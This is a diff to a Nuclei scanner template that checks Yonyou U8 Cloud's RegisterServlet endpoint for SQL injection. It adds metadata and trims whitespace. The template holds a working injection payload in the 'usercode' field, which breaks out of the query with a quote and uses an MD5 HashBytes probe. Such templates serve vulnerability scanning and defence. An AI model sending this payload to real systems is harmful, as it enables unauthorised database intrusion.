@@ -1,7 +1,9 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: yonyou-u8-cloud-RegisterServlet-sql
 
 info:
   name: 用友u8-cloud RegisterServlet SQL注入
+  author: unknown
   severity: high
   description:
     用友U8 cloud的RegisterServlet接口对用户传入的参数未进行有效的过滤，攻击者可利用该漏洞进行sql注入。
@@ -21,8 +23,8 @@ http:
         X-Forwarded-For: 127.0.0.1
         Accept-Encoding: gzip
 
-        usercode=1' and substring(sys.fn_sqlvarbasetostr(HashBytes('MD5','123456')),3,32)>0-- 
-  
+        usercode=1' and substring(sys.fn_sqlvarbasetostr(HashBytes('MD5','123456')),3,32)>0--
+
     matchers-condition: and
     matchers:
       - type: dsl
